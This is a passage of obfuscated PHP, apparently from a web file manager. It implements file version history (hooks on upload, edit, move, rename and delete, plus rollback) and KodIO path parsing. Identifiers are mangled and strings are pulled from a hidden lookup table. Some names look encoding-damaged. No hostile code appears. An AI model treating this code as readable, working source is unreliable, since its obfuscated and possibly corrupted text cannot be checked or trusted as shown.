$GLOBALS[$ÉÆ‹õä®[6]][$ÉÆ‹õä®[89]]; if ($„›Í¨È¹[$ÉÆ‹õä®[1249]] != 1) { return; } if ($„›Í¨È¹[$ÉÆ‹õä®[1250]] <= 0) { return; } if (isset($_REQUEST[$ÉÆ‹õä®[1251]]) && $_REQUEST[$ÉÆ‹õä®[1251]] == $ÉÆ‹õä®[88]) { return; } Hook::bind($ÉÆ‹õä®[1252], $ÉÆ‹õä®[1253]); Hook::bind($ÉÆ‹õä®[1254], $ÉÆ‹õä®[1255]); Hook::bind($ÉÆ‹õä®[1256], $ÉÆ‹õä®[1257]); Hook::bind($ÉÆ‹õä®[1258], $ÉÆ‹õä®[1259]); Hook::bind($ÉÆ‹õä®[1260], $ÉÆ‹õä®[1261]); Hook::bind($ÉÆ‹õä®[1262], $ÉÆ‹õä®[1263]); } public static function eventBeforeUpload($Ê‘¤Ÿ¿±) { if ($Ê‘¤Ÿ¿±[3] && $Ê‘¤Ÿ¿±[3] != REPEAT_REPLACE) { return; } $ş·ôö—ú = self::parsePath($Ê‘¤Ÿ¿±[0]); if (!$ş·ôö—ú) { return; } self::add($ş·ôö—ú); } public static function eventBeforeEdit($×Ãû»Ïˆ) { $°Ğò¼»† = self::parsePath($×Ãû»Ïˆ[0]); if (!$°Ğò¼»†) { return; } self::add($°Ğò¼»†); } public static function eventBeforeCopyFile($çã”ø™¡, $ë…öçöø, $²¥ªÓ×Í, $ß˜Åä•É, $©âİ–ğ, $‰Û€Şâ) { $á¿œåŸÜ =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($²¥ªÓ×Í->_data[$á¿œåŸÜ[1188]]) && $²¥ªÓ×Í->_data[$á¿œåŸÜ[1188]]) { return; } $‡ê€œì = $²¥ªÓ×Í->getPathOuter($ß˜Åä•É); $÷–œ…ş = self::parsePath($‡ê€œì); if (!$÷–œ…ş) { return; } self::add($÷–œ…ş); } public static function eventBeforeRename($Ûßí÷áê) { $õâğ•è€ =& $_SERVER[¹ş¤¶ĞÖ]; $¯¿î´Åú = self::parsePath($Ûßí÷áê[0]); if (!$¯¿î´Åú) { return; } $ÃòŸ†Ù† = self::checkInHistory($¯¿î´Åú); if (!$ÃòŸ†Ù†) { return; } if ($ÃòŸ†Ù†[$õâğ•è€[33]] == $õâğ•è€[200]) { $—îá€•š = self::listData($¯¿î´Åú); if ($—îá€•š && $—îá€•š[$õâğ•è€[398]]) { self::moveHistory($¯¿î´Åú, $Ûßí÷áê[1]); } } else { IO::rename($ÃòŸ†Ù†[$õâğ•è€[84]], $Ûßí÷áê[1]); } } public static function eventBeforeMove($­ÀÅ£æ) { $ÔÀ‹ùçÓ =& $_SERVER[¹ş¤¶ĞÖ]; $à²®Ğ¨“ = self::parsePath($­ÀÅ£æ[0]); if (!$à²®Ğ¨“) { return; } $îªü„Ìù = self::parsePath($­ÀÅ£æ[1]); if (!$îªü„Ìù) { return; } $ĞõÁÁ²Ä = $­ÀÅ£æ[3]; $ŸÇ˜æ¶õ = self::checkInHistory($à²®Ğ¨“); if (!$ŸÇ˜æ¶õ) { return; } $÷øí«úñ = self::pathHistory($îªü„Ìù); if ($ŸÇ˜æ¶õ[$ÔÀ‹ùçÓ[33]] == $ÔÀ‹ùçÓ[200]) { $ğÍ·³… = self::listData($à²®Ğ¨“); $£–ä = rtrim($îªü„Ìù, $ÔÀ‹ùçÓ[8]) . $ÔÀ‹ùçÓ[8] . ($ĞõÁÁ²Ä ? $ĞõÁÁ²Ä : get_path_this($à²®Ğ¨“)); $·õ€„ = self::listData($£–ä); if ($ğÍ·³… && $ğÍ·³…[$ÔÀ‹ùçÓ[398]] && $·õ€„ && $·õ€„[$ÔÀ‹ùçÓ[398]]) { return self::clear($à²®Ğ¨“); } if ($ğÍ·³… && $ğÍ·³…[$ÔÀ‹ùçÓ[398]]) { self::moveHistory($à²®Ğ¨“, $ĞõÁÁ²Ä, $÷øí«úñ); } } else { IO::move($ŸÇ˜æ¶õ[$ÔÀ‹ùçÓ[84]], $÷øí«úñ, !1, $ĞõÁÁ²Ä); self::clearEmptyFolder(IO::pathFather($ŸÇ˜æ¶õ[$ÔÀ‹ùçÓ[84]])); } } public static function eventAfterRemove($´óÑ‡¦«, $Á­ÚÅŠ) { $·Ë…¶ › =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Á­ÚÅŠ) { return; } $‹»ÜÌ˜ = self::parsePath($´óÑ‡¦«[0]); if (!$‹»ÜÌ˜) { return; } $˜´ä—³Ü = self::checkInHistory($‹»ÜÌ˜); if (!$˜´ä—³Ü) { return; } if ($˜´ä—³Ü[$·Ë…¶ ›[33]] == $·Ë…¶ ›[200]) { $ç§™œ·˜ = self::listData($‹»ÜÌ˜, !1); if ($ç§™œ·˜ && $ç§™œ·˜[$·Ë…¶ ›[398]]) { self::clear($‹»ÜÌ˜, !1); } } else { IO::remove($˜´ä—³Ü[$·Ë…¶ ›[84]]); self::clearEmptyFolder(IO::pathFather($˜´ä—³Ü[$·Ë…¶ ›[84]])); } } private static function checkInHistory($òËçŠä¾) { $Ëª˜·Ğ = self::pathHistory($òËçŠä¾); if (!IO::exist($Ëª˜·Ğ)) { $Ëª˜·Ğ .= $_SERVER[¹ş¤¶ĞÖ][1264]; } return IO::exist($Ëª˜·Ğ) ? IO::info($Ëª˜·Ğ) : !1; } private static function parsePath($˜áè¥ø) { $‡àô¤º =& $_SERVER[¹ş¤¶ĞÖ]; if (!$˜áè¥ø) { return !1; } if ($GLOBALS[$‡àô¤º[1265]]) { return; } $ÑŠ‡…À = KodIO::parse($˜áè¥ø); $ú¥¡Ï†¿ = $ÑŠ‡…À[$‡àô¤º[33]]; $‘è¨á£ = !$ú¥¡Ï†¿ || $ú¥¡Ï†¿ == KodIO::KOD_IO || $ú¥¡Ï†¿ == KodIO::KOD_SHARE_ITEM; if (!$‘è¨á£ || !$ÑŠ‡…À[$‡àô¤º[1266]]) { return !1; } if (substr($˜áè¥ø, 0, strlen(DATA_PATH . $‡àô¤º[1267])) == DATA_PATH . $‡àô¤º[1267]) { return !1; } if ($ú¥¡Ï†¿ == KodIO::KOD_SHARE_ITEM) { $âœÙúŞç = IO::init($˜áè¥ø); if ($âœÙúŞç->pathParse[$‡àô¤º[1184]]) { return self::parsePath($âœÙúŞç->pathParse[$‡àô¤º[1184]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ñÇÛ±™Ç = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $‡àô¤º[1268]); foreach ($ñÇÛ±™Ç as $¤îŸú¶”) { if (!$ú¥¡Ï†¿ && substr($˜áè¥ø, 0, strlen($¤îŸú¶”)) == $¤îŸú¶”) { return !1; } } self::log($GLOBALS[$‡àô¤º[1179]] . $‡àô¤º[1269] . $˜áè¥ø); return $˜áè¥ø; } private static function pathHistory($’ÂÙú¤£) { $ùÛó…“Ğ =& $_SERVER[¹ş¤¶ĞÖ]; $×÷Öİ¯ = self::$_historyBase . ltrim(KodIO::clear($’ÂÙú¤£), $ùÛó…“Ğ[8]); $×÷Öİ¯ = str_replace(array($ùÛó…“Ğ[1270]), array($ùÛó…“Ğ[1271]), $×÷Öİ¯); return $×÷Öİ¯; } public static function log($’»¶ëğŒ) { } public static function historyCount($›õ ùİµ) { $„ÛÂ¾Òó =& $_SERVER[¹ş¤¶ĞÖ]; $ËÑ€«»« = array(); $À²ÄÂÓË = array(); foreach ($›õ ùİµ as $”óÌ·æï) { $ïçï÷ª³ = get_path_father($”óÌ·æï); if (!$À²ÄÂÓË[$ïçï÷ª³]) { $À²ÄÂÓË[$ïçï÷ª³] = array(); } $À²ÄÂÓË[$ïçï÷ª³][] = get_path_this($”óÌ·æï); } foreach ($À²ÄÂÓË as $ïçï÷ª³ => $›¼øü¡) { $È©Üö´– = self::parsePath($ïçï÷ª³); if (!$È©Üö´–) { continue; } foreach ($›¼øü¡ as $İƒÉÆÊ¯) { $î·šíÉ€ = self::listData(rtrim($È©Üö´–, $„ÛÂ¾Òó[8]) . $„ÛÂ¾Òó[8] . $İƒÉÆÊ¯, !1); if ($î·šíÉ€ && $î·šíÉ€[$„ÛÂ¾Òó[398]]) { $ËÑ€«»«[rtrim($ïçï÷ª³, $„ÛÂ¾Òó[8]) . $„ÛÂ¾Òó[8] . $İƒÉÆÊ¯] = count($î·šíÉ€[$„ÛÂ¾Òó[398]]); } } } return $ËÑ€«»«; } public static function add($Ò¥ñ¥‹») { $¯éÓªË¤ =& $_SERVER[¹ş¤¶ĞÖ]; $•“İº™— = self::listData($Ò¥ñ¥‹»); if (!$•“İº™—) { return; } $ˆèã³„ˆ = Model($¯éÓªË¤[796])->get($¯éÓªË¤[1272]); $ı‰¡Åœã = $GLOBALS[$¯éÓªË¤[6]][$¯éÓªË¤[89]][$¯éÓªË¤[1250]]; $óƒŒÖ–Õ = $ˆèã³„ˆ == $¯éÓªË¤[1273] ? min(5, $ı‰¡Åœã) : $ı‰¡Åœã; if ($ı‰¡Åœã <= 0) { return; } $¡—ÆÈ¹ = IO::info($Ò¥ñ¥‹»); $‰¨Ìè¯Ë = $•“İº™—[$¯éÓªË¤[398]]; if ($¡—ÆÈ¹[$¯éÓªË¤[76]] == 0) { return; } if ($¡—ÆÈ¹[$¯éÓªË¤[76]] >= 1024 * 1024 * 500) { return !1; } $‘È’Ê‹© = IO::hashSimple($Ò¥ñ¥‹»); if ($‰¨Ìè¯Ë && $‰¨Ìè¯Ë[0][$¯éÓªË¤[177]] == $‘È’Ê‹©) { return !0; } if (array_key_exists($¯éÓªË¤[203], $¡—ÆÈ¹) && !$¡—ÆÈ¹[$¯éÓªË¤[203]]) { return !1; } $ÒÑùÜËİ = short_id(time()); $ã…‚ºûë = array($¯éÓªË¤[428] => $ÒÑùÜËİ, $¯éÓªË¤[177] => $‘È’Ê‹©, $¯éÓªË¤[32] => $¡—ÆÈ¹[$¯éÓªË¤[32]] . $¯éÓªË¤[10] . date($¯éÓªË¤[1274]) . rand_string(1), $¯éÓªË¤[76] => $¡—ÆÈ¹[$¯éÓªË¤[76]], $¯éÓªË¤[483] => USER_ID, $¯éÓªË¤[201] => time(), $¯éÓªË¤[1275] => $¯éÓªË¤[12]); IO::mkdir($•“İº™—[$¯éÓªË¤[1276]]); $¥¬¨®Ë› = IO::copy($Ò¥ñ¥‹», $•“İº™—[$¯éÓªË¤[1276]], !1, $ã…‚ºûë[$¯éÓªË¤[32]]); if (!$¥¬¨®Ë›) { self::clearEmptyFolder($•“İº™—[$¯éÓªË¤[1276]]); return !1; } array_unshift($‰¨Ìè¯Ë, $ã…‚ºûë); if (count($‰¨Ìè¯Ë) > $óƒŒÖ–Õ) { $Ì†‘Ï = array_slice($‰¨Ìè¯Ë, $óƒŒÖ–Õ); foreach ($Ì†‘Ï as $ÆíóúéÖ) { IO::remove($•“İº™—[$¯éÓªË¤[1276]] . $ÆíóúéÖ[$¯éÓªË¤[32]]); } $‰¨Ìè¯Ë = array_slice($‰¨Ìè¯Ë, 0, $óƒŒÖ–Õ); } return self::saveData($•“İº™—[$¯éÓªË¤[1277]], $‰¨Ìè¯Ë); } public static function remove($ä¥‹­Òá, $»ÛŞšÈ) { $ç›Æ±µ» =& $_SERVER[¹ş¤¶ĞÖ]; $†¾±ï£û = self::listData($ä¥‹­Òá); $Å¢ùÖéã = array(); if (!$†¾±ï£û) { return !1; } foreach ($†¾±ï£û[$ç›Æ±µ»[398]] as $–€¥„ôš) { if ($–€¥„ôš[$ç›Æ±µ»[428]] == $»ÛŞšÈ) { IO::remove($†¾±ï£û[$ç›Æ±µ»[1276]] . $–€¥„ôš[$ç›Æ±µ»[32]]); continue; } $Å¢ùÖéã[] = $–€¥„ôš; } return self::saveData($†¾±ï£û[$ç›Æ±µ»[1277]], $Å¢ùÖéã); } public static function clear($†Á–í£, $‚ç©‰ = true) { $­ŒĞ‚µç =& $_SERVER[¹ş¤¶ĞÖ]; $®­ÔÏ™µ = self::listData($†Á–í£, $‚ç©‰); if (!$®­ÔÏ™µ) { return !1; } foreach ($®­ÔÏ™µ[$­ŒĞ‚µç[398]] as $Æ–áıÏÙ) { IO::remove($®­ÔÏ™µ[$­ŒĞ‚µç[1276]] . $Æ–áıÏÙ[$­ŒĞ‚µç[32]]); } return self::saveData($®­ÔÏ™µ[$­ŒĞ‚µç[1277]], array()); } public static function moveHistory($‡¾›‹”, $Å„šÇæ = '', $İÀâ’ñï = '') { $Úì©ôİå =& $_SERVER[¹ş¤¶ĞÖ]; $¥­Ã—ıú = self::listData($‡¾›‹”, !1); if (!$¥­Ã—ıú || !$¥­Ã—ıú[$Úì©ôİå[398]]) { return !1; } $±³§­ôÂ = $Úì©ôİå[1264]; $Å„šÇæ = $Å„šÇæ ? $Å„šÇæ : get_path_this($‡¾›‹”); $İÀâ’ñï = $İÀâ’ñï ? $İÀâ’ñï : $¥­Ã—ıú[$Úì©ôİå[1276]]; $ïºù±”• = substr(get_path_this($¥­Ã—ıú[$Úì©ôİå[1277]]), 0, -strlen($±³§­ôÂ)); foreach ($¥­Ã—ıú[$Úì©ôİå[398]] as $Ø§ğàòÊ => $¬¯–î) { $èÇÇ¹ºŠ = $Å„šÇæ . substr($¬¯–î[$Úì©ôİå[32]], strlen($ïºù±”•)); $Öñ¼¼üî = IO::move($¥­Ã—ıú[$Úì©ôİå[1276]] . $¬¯–î[$Úì©ôİå[32]], $İÀâ’ñï, !1, $èÇÇ¹ºŠ); if ($Öñ¼¼üî) { $¥­Ã—ıú[$Úì©ôİå[398]][$Ø§ğàòÊ][$Úì©ôİå[32]] = $èÇÇ¹ºŠ; } } $¥­Ã—ıú[$Úì©ôİå[1277]] = IO::move($¥­Ã—ıú[$Úì©ôİå[1277]], $İÀâ’ñï, !1, $Å„šÇæ . $±³§­ôÂ); self::saveData($¥­Ã—ıú[$Úì©ôİå[1277]], $¥­Ã—ıú[$Úì©ôİå[398]]); self::clearEmptyFolder($¥­Ã—ıú[$Úì©ôİå[1276]]); } public static function rollback($ßÛßÒÌŠ, $Ä¹›èàå) { $Èİ«çá¡ =& $_SERVER[¹ş¤¶ĞÖ]; $ã¸ŒÚÊĞ = self::listData($ßÛßÒÌŠ); if (!$ã¸ŒÚÊĞ) { return; } $›²šÊ´ = IO::info($ßÛßÒÌŠ); foreach ($ã¸ŒÚÊĞ[$Èİ«çá¡[398]] as $ã†«áğ¬ => $ß¸ÌŒ“ˆ) { if ($ß¸ÌŒ“ˆ[$Èİ«çá¡[428]] == $Ä¹›èàå) { self::add($ßÛßÒÌŠ); $íâôÍ‘· = $ã¸ŒÚÊĞ[$Èİ«çá¡[1276]] . $ß¸ÌŒ“ˆ[$Èİ«çá¡[32]]; $¼ÆãÑµš = IO::copy($íâôÍ‘·, IO::pathFather($ßÛßÒÌŠ), REPEAT_REPLACE, $›²šÊ´[$Èİ«çá¡[32]]); if ($¼ÆãÑµš) { self::remove($ßÛßÒÌŠ, $Ä¹›èàå); } return $¼ÆãÑµš; } } return !1; } public static function setDetail($µ¢œ¨õÂ, $‡ÖµîÌÔ, $©¦±•) { $Ï ¤ÖäÈ =& $_SERVER[¹ş¤¶ĞÖ]; $à¿ÁÚ™¹ = self::listData($µ¢œ¨õÂ); if (!$à¿ÁÚ™¹) { return; } foreach ($à¿ÁÚ™¹[$Ï ¤ÖäÈ[398]] as $ê‹Í¸ìÓ => $á´ğ»à) { if ($á´ğ»à[$Ï ¤ÖäÈ[428]] == $‡ÖµîÌÔ) { $à¿ÁÚ™¹[$Ï ¤ÖäÈ[398]][$ê‹Í¸ìÓ][$Ï ¤ÖäÈ[1275]] = $©¦±•; self::saveData($à¿ÁÚ™¹[$Ï ¤ÖäÈ[1277]], $à¿ÁÚ™¹[$Ï ¤ÖäÈ[398]]); return !0; } } return !1; } public static function fileInfo($ù§ç½ª¬, $ë¹úá²) { $Ü˜Äµê =& $_SERVER[¹ş¤¶ĞÖ]; $º±ëØÜ‰ = self::listData($ù§ç½ª¬); if (!$º±ëØÜ‰) { show_json(LNG($Ü˜Äµê[105]), !1); } $…¨ØÁ¦ = $Ü˜Äµê[12]; foreach ($º±ëØÜ‰[$Ü˜Äµê[398]] as $çÛÆº©ú => $“ºÙ­…) { if ($“ºÙ­…[$Ü˜Äµê[428]] != $ë¹úá²) { continue; } $…¨ØÁ¦ = $º±ëØÜ‰[$Ü˜Äµê[1276]] . $“ºÙ­…[$Ü˜Äµê[32]]; break; } if (!$…¨ØÁ¦) { show_json(LNG($Ü˜Äµê[105]), !1); } return IO::info($…¨ØÁ¦); } public static function fileOut($õáµ¨øæ, $Šö‹‹ƒ½, $‰¢ïÎ°¢ = false) { $¾×ÄÓñÕ =& $_SERVER[¹ş¤¶ĞÖ]; $œıÉ×Í¦ = self::fileInfo($õáµ¨øæ, $Šö‹‹ƒ½); $±˜ÙåŸ =& $GLOBALS[$¾×ÄÓñÕ[7]]; $‰¢ïÎ°¢ = isset($±˜ÙåŸ[$¾×ÄÓñÕ[1227]]) && $±˜ÙåŸ[$¾×ÄÓñÕ[1227]] == 1; if (isset($±˜ÙåŸ[$¾×ÄÓñÕ[33]]) && $±˜ÙåŸ[$¾×ÄÓñÕ[33]] == $¾×ÄÓñÕ[1278]) { return IO::fileOutImage($œıÉ×Í¦[$¾×ÄÓñÕ[84]], $±˜ÙåŸ[$¾×ÄÓñÕ[1279]]); } IO::fileOut($œıÉ×Í¦[$¾×ÄÓñÕ[84]], $‰¢ïÎ°¢, get_path_this($õáµ¨øæ)); } public static function listData($ğîÂçÜÜ, $•–äŠâî = true) { $–©«ßË† =& $_SERVER[¹ş¤¶ĞÖ]; if ($•–äŠâî && !IO::exist($ğîÂçÜÜ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ğîÂçÜÜ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ì¢š–õº = self::pathHistory($ğîÂçÜÜ); $æ‹ˆÖ§½ = array($–©«ßË†[1277] => $Ì¢š–õº . $–©«ßË†[1264], $–©«ßË†[1276] => rtrim(get_path_father($Ì¢š–õº), $–©«ßË†[8]) . $–©«ßË†[8], $–©«ßË†[398] => array()); $Œ¯ëÎÈ‡ = IO::getContent($æ‹ˆÖ§½[$–©«ßË†[1277]]); if ($Œ¯ëÎÈ‡) { $¿ÙÍîûì = json_decode($Œ¯ëÎÈ‡, !0); if (is_array($¿ÙÍîûì)) { $æ‹ˆÖ§½[$–©«ßË†[398]] = $¿ÙÍîûì; } } return $æ‹ˆÖ§½; } private static function saveData($Ãäêšûú, $¸†î«îÈ) { $ß¸©Û” =& $_SERVER[¹ş¤¶ĞÖ]; self::log($ß¸©Û”[1280] . $Ãäêšûú . $ß¸©Û”[71] . count($¸†î«îÈ), $ß¸©Û”[777]); if ($¸†î«îÈ) { return IO::setContent($Ãäêšûú, json_encode($¸†î«îÈ)); } $À¶Î¿ª¦ = IO::pathFather($Ãäêšûú); IO::remove($Ãäêšûú); self::clearEmptyFolder($À¶Î¿ª¦); return !0; } public static function clearEmptyFolder($ÈúØøİ) { $öıà¹˜» =& $_SERVER[¹ş¤¶ĞÖ]; if (trim($ÈúØøİ, $öıà¹˜»[8]) == trim(self::$_historyBase, $öıà¹˜»[8])) { return; } $¥Íá­‘˜ = IO::pathFather($ÈúØøİ); $Äšƒ·³ = IO::has($ÈúØøİ, !0); if ($Äšƒ·³[$öıà¹˜»[207]] > 0 || $Äšƒ·³[$öıà¹˜»[208]] > 0) { return; } IO::remove($ÈúØøİ); self::clearEmptyFolder($¥Íá­‘˜); } private static function getBasePath() { $ı†æ’‚è =& $_SERVER[¹ş¤¶ĞÖ]; $´í…ÂŠÔ = Model($ı†æ’‚è[1281])->get($ı†æ’‚è[1282]); if ($´í…ÂŠÔ) { if (!IO::exist($´í…ÂŠÔ)) { IO::mkdir($´í…ÂŠÔ); } if (get_path_this($´í…ÂŠÔ) == $ı†æ’‚è[1267]) { $²ÉÕÖ† = $ı†æ’‚è[1283] . rand_string(8); @rename($´í…ÂŠÔ, get_path_father($´í…ÂŠÔ) . $ı†æ’‚è[8] . $²ÉÕÖ†); $´í…ÂŠÔ = DATA_PATH . $²ÉÕÖ† . $ı†æ’‚è[8]; file_put_contents(DATA_PATH . $ı†æ’‚è[1217], $ı†æ’‚è[12]); Model($ı†æ’‚è[1281])->set($ı†æ’‚è[1282], $´í…ÂŠÔ); } return $´í…ÂŠÔ; } $´í…ÂŠÔ = DATA_PATH . $ı†æ’‚è[1283] . rand_string(8) . $ı†æ’‚è[8]; $´í…ÂŠÔ = IO::mkdir($´í…ÂŠÔ); $´í…ÂŠÔ = rtrim($´í…ÂŠÔ, $ı†æ’‚è[8]) . $ı†æ’‚è[8]; file_put_contents($´í…ÂŠÔ . $ı†æ’‚è[1217], $ı†æ’‚è[12]); file_put_contents(DATA_PATH . $ı†æ’‚è[1217], $ı†æ’‚è[12]); Model($ı†æ’‚è[1281])->set($ı†æ’‚è[1282], $´í…ÂŠÔ); return $´í…ÂŠÔ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\x52\x65\x63\x79\143\154\145\175"; const KOD_USER_FAV = "\173\165\163\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\106\151\154\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\151\x6c\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\x70\122\x6f\157\x74\123\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\163\145\162\x53\150\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\123\150\141\x72\x65\114\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\141\162\145\111\164\145\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\162\122\x65\156\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\162\175"; public static function typeList() { $—¦çïğ¡ =& $_SERVER[¹ş¤¶ĞÖ]; return array($—¦çïğ¡[1284] => self::KOD_SOURCE, $—¦çïğ¡[1285] => self::KOD_USER_RECYCLE, $—¦çïğ¡[1286] => self::KOD_USER_FAV, $—¦çïğ¡[1287] => self::KOD_USER_FILE_TAG, $—¦çïğ¡[1288] => self::KOD_USER_FILE_TYPE, $—¦çïğ¡[1289] => self::KOD_GROUP_ROOT_SELF, $—¦çïğ¡[1290] => self::KOD_USER_SHARE, $—¦çïğ¡[1291] => self::KOD_USER_SHARE_LINK, $—¦çïğ¡[1292] => self::KOD_USER_SHARE_TO_ME, $—¦çïğ¡[1293] => self::KOD_SHARE_ITEM, $—¦çïğ¡[1294] => self::KOD_SHARE_LINK, $—¦çïğ¡[1295] => self::KOD_SEARCH, $—¦çïğ¡[1296] => self::KOD_BLOCK, $—¦çïğ¡[1297] => self::KOD_IO, $—¦çïğ¡[1298] => self::KOD_USER_RECENT, $—¦çïğ¡[1299] => self::KOD_USER_DRIVER); } public static function parse($ãŸâäŸ‹) { $€ê¦ø‰ =& $_SERVER[¹ş¤¶ĞÖ]; $ãŸâäŸ‹ = self::clear($ãŸâäŸ‹); $Ÿ¢ëôÊ€ = array_values(self::typeList()); preg_match($€ê¦ø‰[1300], $ãŸâäŸ‹, $°şäÛ™); $“üØÆİÌ = array($€ê¦ø‰[451] => !1, $€ê¦ø‰[1301] => !1, $€ê¦ø‰[448] => !1, $€ê¦ø‰[84] => $ãŸâäŸ‹, $€ê¦ø‰[1202] => !1, $€ê¦ø‰[1201] => $€ê¦ø‰[12]); if (is_array($°şäÛ™) && count($°şäÛ™) == 5) { $Ššı˜„» = $€ê¦ø‰[1302] . $°şäÛ™[2] . $€ê¦ø‰[356]; if (in_array($Ššı˜„», $Ÿ¢ëôÊ€)) { $“üØÆİÌ[$€ê¦ø‰[1202]] = $°şäÛ™[1]; $“üØÆİÌ[$€ê¦ø‰[33]] = $Ššı˜„»; $“üØÆİÌ[$€ê¦ø‰[1303]] = substr($Ššı˜„», 1, -1); $“üØÆİÌ[$€ê¦ø‰[428]] = $°şäÛ™[3]; } $“üØÆİÌ[$€ê¦ø‰[1201]] = $°şäÛ™[4]; } $¾ˆ²§Øä = array($€ê¦ø‰[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $“üØÆİÌ[$€ê¦ø‰[1266]] = in_array($“üØÆİÌ[$€ê¦ø‰[33]], $¾ˆ²§Øä); return $“üØÆİÌ; } public static function isTruePath($¦âÎ­É„) { $ğ²Ù®›¬ =& $_SERVER[¹ş¤¶ĞÖ]; if (substr($¦âÎ­É„, 0, 1) != $ğ²Ù®›¬[1302]) { return !0; } if (strpos($¦âÎ­É„, $ğ²Ù®›¬[437]) === 0) { return !0; } if (strpos($¦âÎ­É„, $ğ²Ù®›¬[1270]) === 0) { return !0; } if (strpos($¦âÎ­É„, $ğ²Ù®›¬[1304]) === 0) { return !0; } if (strpos($¦âÎ­É„, $ğ²Ù®›¬[1305]) === 0) { return !0; } if (strpos($¦âÎ­É„, $ğ²Ù®›¬[1306]) === 0) { return !0; } return !1; } public static function clear($ŠÍ¯ªÜ) { $û«Ò¶Ì =& $_SERVER[¹ş¤¶ĞÖ]; $ŠÍ¯ªÜ = str_replace(array($û«Ò¶Ì[1111], $û«Ò¶Ì[231]), $û«Ò¶Ì[53], $ŠÍ¯ªÜ); $ŠÍ¯ªÜ = str_replace($û«Ò¶Ì[97], $û«Ò¶Ì[8], $ŠÍ¯ªÜ); $àÎ¼ç = $û«Ò¶Ì[1307]; if (substr($ŠÍ¯ªÜ, 0, 3) == $û«Ò¶Ì[1308]) { $ŠÍ¯ªÜ = substr($ŠÍ¯ªÜ, 3); } while (strstr($ŠÍ¯ªÜ, $àÎ¼ç)) { $ŠÍ¯ªÜ = str_replace($àÎ¼ç, $û«Ò¶Ì[8], $ŠÍ¯ªÜ); } $ŠÍ¯ªÜ = preg_replace($û«Ò¶Ì[1309], $û«Ò¶Ì[8], $ŠÍ¯ªÜ); if ($ŠÍ¯ªÜ == $û«Ò¶Ì[8]) { return $û«Ò¶Ì[8]; } $ŠÍ¯ªÜ = rtrim($ŠÍ¯ªÜ, $û«Ò¶Ì[8]); return $ŠÍ¯ªÜ; } public static function pathTrue($­ÍšĞ÷±) { $À¸Õò«÷ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$­ÍšĞ÷±) { return $À¸Õò«÷[12]; } $ÁìíÌ™Ğ = strlen($­ÍšĞ÷±); if (substr($­ÍšĞ÷±, $ÁìíÌ™Ğ - 1, 1) == $À¸Õò«÷[8]) { $­ÍšĞ÷± = substr($­ÍšĞ÷±, 0, $ÁìíÌ™Ğ - 1); } $­ÍšĞ÷± = str_replace($À¸Õò«÷[548], $À¸Õò«÷[8], str_replace($À¸Õò«÷[1310], $À¸Õò«÷[8], $­ÍšĞ÷±)); if (substr($­ÍšĞ÷±, 0, 2) == $À¸Õò«÷[1311]) { $­ÍšĞ÷± = substr($­ÍšĞ÷±, 2); } if (!strstr($­ÍšĞ÷±, $À¸Õò«÷[1308])) { return $­ÍšĞ÷±; } $ï„™ßñ = explode($À¸Õò«÷[8], $­ÍšĞ÷±); $Ê¸¦á = array_search($À¸Õò«÷[1312], $ï„™ßñ); if ($Ê¸¦á >= 0) { $ï„™ßñ[$Ê¸¦á] = -1; } if ($Ê¸¦á > 0) { $ï„™ßñ[$Ê¸¦á - 1] = -1; } $®ÛÎ = array(); foreach ($ï„™ßñ as $†ëÈ –) { if ($†ëÈ – !== -1) { $®ÛÎ[] = $†ëÈ –; } } return self::pathTrue(implode($À¸Õò«÷[8], $®ÛÎ)); } public static function sourceID($öñÑë›) { $Óæáî =& $_SERVER[¹ş¤¶ĞÖ]; $ŞÚÕ¼–¬ = self::parse($öñÑë›); if ($ŞÚÕ¼–¬[$Óæáî[33]] !== self::KOD_SOURCE) { show_json(LNG($Óæáî[1313]), !1); } return $ŞÚÕ¼–¬[$Óæáî[428]]; } public static function make($—¹´ë–ù) { if (!$—¹´ë–ù) { return !1; } return self::makePath(self::KOD_SOURCE, intval($—¹´ë–ù)); } public static function makeShare($êµÖÄëÓ, $«»è¸ì) { return self::makePath(self::KOD_SHARE_ITEM, $êµÖÄëÓ, $«»è¸ì); } public static function makeFileTypePath($¡¾¢ÓíÅ) { return self::makePath(self::KOD_USER_FILE_TYPE, $¡¾¢ÓíÅ); } public static function makeFileTagPath($¸…§å¼) { return self::makePath(self::KOD_USER_FILE_TAG, $¸…§å¼); } public static function makePath($ÂÅ•»ûŒ, $×ª©Ô” = '', $ÖğÌÂ©Ê = '') { $éğõ¾õÔ =& $_SERVER[¹ş¤¶ĞÖ]; $²òƒÇÊÑ = substr($ÂÅ•»ûŒ, 1, -1); $Ó¢ü÷øÈ = $éğõ¾õÔ[1314] . $²òƒÇÊÑ . $éğõ¾õÔ[1315] . $×ª©Ô” . $éğõ¾õÔ[1316]; $Ó¢ü÷øÈ = $ÖğÌÂ©Ê ? $Ó¢ü÷øÈ . $ÖğÌÂ©Ê . $éğõ¾õÔ[8] : $Ó¢ü÷øÈ; return $Ó¢ü÷øÈ; } public static function hashPath($»ÕÛü‰î, 